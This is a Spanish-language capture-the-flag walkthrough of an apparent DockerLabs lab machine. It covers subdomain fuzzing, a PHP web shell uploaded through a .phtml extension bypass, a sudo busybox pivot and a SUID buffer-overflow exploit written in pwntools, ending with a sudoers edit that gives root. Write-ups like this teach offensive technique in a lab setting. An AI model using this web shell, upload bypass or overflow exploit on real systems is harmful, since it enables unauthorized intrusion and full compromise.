## Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/cc9f3d9e-c8b9-4428-b9f0-81158e407362)

`nmap` reporta solo un puerto (servicio HTTP), por lo que accedo al servicio web 

![image](https://github.com/user-attachments/assets/ecd822b3-e318-4e48-b178-3545165a4c1e)

me consigo con la plantilla por defecto de apache pero un tanto modificada con informacion, `/var/www/5eEk3r`, lo primero que hare sera agregar en `/etc/hosts`
`5eEk3r` como dominio e intentar acceder a ver si cambia algo

```bash
echo '172.17.0.2 5eEk3r.dl' >> /etc/hosts
```

ahora accedo nuevamente al servicio web


![image](https://github.com/user-attachments/assets/76f15ea2-a3f3-43e3-8c5f-8428c5e2b167)

observo lo mismo, asi que le reliazo fuzzinf web

```bash
feroxbuster -u http://5eek3r.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```

![image](https://github.com/user-attachments/assets/9ef94e30-2282-47b7-a4e3-fba9134e385b)

por lo visto no hay nada de interes por lo que intento buscar subdominios

```bash
wfuzz -H "Host: FUZZ.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl/
```

![image](https://github.com/user-attachments/assets/aa704f75-eaf9-4d7d-8b02-49dd7da65bf6)

agrego dicho subdominio en `/etc/hosts` que quede asi

```bash
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl
```
y preocedo acceder 

![image](https://github.com/user-attachments/assets/299cd8ea-a2aa-4a5e-b513-88c85b7715c7)

me consigo con una web que codifica el texto que le pasemos sustituyendo cada letra por la siguiente en el puerto `14`, inspeccionando la web me consigo con un comentario

![image](https://github.com/user-attachments/assets/ee3cc4de-7833-4b72-83b7-8a50463151c0)

en un principio intentar explotar un `xss` no tiene mucho sentido si el objetivo es intentar acceder al servidor por lo que continuo sin hacer caso al comentario del `xss`.
Esta web no parece tener nada mas asi que continuo buscando subdominios en vista de que no tengo nada mas que intentar

```bash
wfuzz -H "Host: FUZZ.crosswords.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl --hh=10705
```

![image](https://github.com/user-attachments/assets/9d48f1f7-d4c4-4d06-a9c2-db94f50e2727)

obtengo el subdominio `admin` y realizo el mismo procedimiento en `/etc/hosts` y agrego `admin` quedando asi:

```bash
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl admin.crosswords.5eEk3r.dl
```

procedo acceder

![image](https://github.com/user-attachments/assets/36d1e6a9-e65b-41c6-9b93-ef571b890dba)

damos con un administrador de archivos donde es posible eliminar asi como cargar archivos y por lo visto la web interpreta `php` ya que observo un `index.php`, por tal
motivo procedo con la carga de un archivo `php` malicioso

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
cargo el archivo malicioso y me arroja el siguiente mensaje

![image](https://github.com/user-attachments/assets/b38e2f8b-1f5b-46de-9136-ee11bdc85360)

no es posible cargar un archivo `php` directamente pero existen formas, primero intente el bypass modificando la peticion en el `Content-Type` pero el servidor no
esta validando esto sino la extension del archivo por lo que tras ir testeando diferentes extensiones logre dar con la que es posible cargar y sobre todo la extension
que es interpretada como `php` por el servidor.

![image](https://github.com/user-attachments/assets/e0b7e362-9e68-421f-a794-7bf766ad1bfa)

como se observa, la extension es `phtml`; asi que ya cargado el archivo malicioso procedo a obtener la `revershell`

![image](https://github.com/user-attachments/assets/bf4084f1-df45-4bba-90eb-af1a2f17e9f8)


## Escalada de Privilegios

### www-data

tratamiento de la tty

```bash
script /dev/null -c bash 
^z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

veo que puedo ejecutar el binario `busybox` como el usuario `astu`

![image](https://github.com/user-attachments/assets/2bb9e862-7e43-4cac-b696-a794a62f62b8)

asi que para saltar al usuario `astu` ejecutamos lo siguiente

```bash
sudo -u astu /usr/bin/busybox sh
```

### astu

busco binarios que tengas el bit suid activo y consigo uno en el directorio del usuario `astu`

```bash
find / -perm -4000 2>/dev/null
```

![image](https://github.com/user-attachments/assets/2a70cd64-e3cc-4374-b181-192080217306)

me voy hasta el directorio que contiene el binario `bs64` y testeo

![image](https://github.com/user-attachments/assets/16574cef-a50d-4a38-8ff8-0025a3fd4522)

ocurrio un fallo de segmentacion, lo que es un indicativo de un posible desbordamiento de buffer, por lo que vere si trata de uno, pero enviare el binario a mi maquina para examinar 

![image](https://github.com/user-attachments/assets/4cbedb16-3d4b-4e67-9920-45be0d32fd9c)

trata de un binario de 64 bit, ahora intentare calcular el `offset`

![image](https://github.com/user-attachments/assets/6c014a0d-d3b5-4fb6-8283-b1492bd732b5)

el `offset` resulta ser de 72 byte, ahora testeo el control sobre el registro `RIP` enviando al binario la siguiente cadena

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
```

![image](https://github.com/user-attachments/assets/ce1a09e5-4e56-45ed-adbf-d4cba76faef0)

en efecto, tengo el control de dicho registro, ahora chequeo las protecciones en el binario

```bash
checksec --file=bs64
```

![image](https://github.com/user-attachments/assets/a1a7a12d-ca67-42bc-9491-fa9c29a69dc3)

debido a que el binario cuenta con la proteccion `NX` activa, no seria posible la ejecucion de una `shellcode` asi que primero le realizo ingenieria inversa con `ghidra` al binario

![image](https://github.com/user-attachments/assets/d9830074-c163-4383-acb9-924a6a78a8c4)

observo una funcion llamada `fire` que ejecuta una `/bin/sh`, por lo que la explotacion consiste en localizar la direccion
de memoria de `fire()` y saltar a ella para obtener la `shell-root`, por lo que corremos el binario con el depurador `gdb` y localizamos la direccion de `fire()`

![image](https://github.com/user-attachments/assets/c646a00d-2f00-470d-834a-cfcc0c17e2b9)

la direccion de memoria seria `0x40136a` asi que ahora construyo un exploit

```python
from pwn import *

def explotation():

       OFFSET = 72
       BUFF = b"A"*OFFSET
       FUNCTI = p64(0x40136a)
       PAYLOAD = BUFF + FUNCTI
       binary = "./bs64"
       l = process(binary)
       l.sendline(PAYLOAD)
       l.interactive()
       l.close()

if __name__ == '__main__':
    explotation()
```
le damos permisos de ejecucion `chmod +x exploit.py` y al ejecutarlo ocurre un error


![image](https://github.com/user-attachments/assets/40f8ac62-8a18-431e-b8bd-357e166931dd)

este error se produce cuando un programa intenta acceder a una ubicación de memoria que no está permitida, asi que voy a desemsamblar la funcion `fire()`

![image](https://github.com/user-attachments/assets/c526b425-cc73-4e89-9cd9-71122bddbd64)

ahora testeare usando la direccion de memoria `0x000000000040136b` por lo que modificamos la direccion de memoria en el exploit quedando asi

```python3
from pwn import *

def explotation():

       OFFSET = 72
       BUFF = b"A"*OFFSET
       FUNCTI = p64(0x000000000040136b)
       PAYLOAD = BUFF + FUNCTI
       binary = "./bs64"
       l = process(binary)
       l.sendline(PAYLOAD)
       l.interactive()
       l.close()

if __name__ == '__main__':
    explotation()
```

ejecuto el binario y veo que ahora si logro obtener una `shell`

![image](https://github.com/user-attachments/assets/93e56164-8792-462b-9af6-ddbfab897c13)

paso el exploit a la maquina comprometida y vuelvo a modificar el exploit pero esta vez cambiaremos la ruta al binario

```python3
from pwn import *

def explotation():

       OFFSET = 72
       BUFF = b"A"*OFFSET
       FUNCTI = p64(0x000000000040136b)
       PAYLOAD = BUFF + FUNCTI
       binary = "/home/astu/secure/bs64"
       l = process(binary)
       l.sendline(PAYLOAD)
       l.interactive()
       l.close()

if __name__ == '__main__':
    explotation()
```
ya todo listo ejecuto el exploit 

![image](https://github.com/user-attachments/assets/13d235ef-6f7e-4451-9545-e923b717a934)

parcialmente soy `root` pero para tener una `shell-root` al 100% ejecutamos lo siguiente:

```bash
echo 'astu ALL=(ALL:ALL) ALL' >> /etc/sudoers
passwd astu #asignamos una password nueva para astu
```
salimos de la `shell-interactiva` y escalamos a `root` con `sudo su` y cuando solicite la password le pasamos la que asignamos anteriormente (en mi caso 1234)

![image](https://github.com/user-attachments/assets/008b45ad-8dea-4e82-933b-7ddc9d5b9e92)

obtengo la shell 100% `root`

### PWNET-ROOT
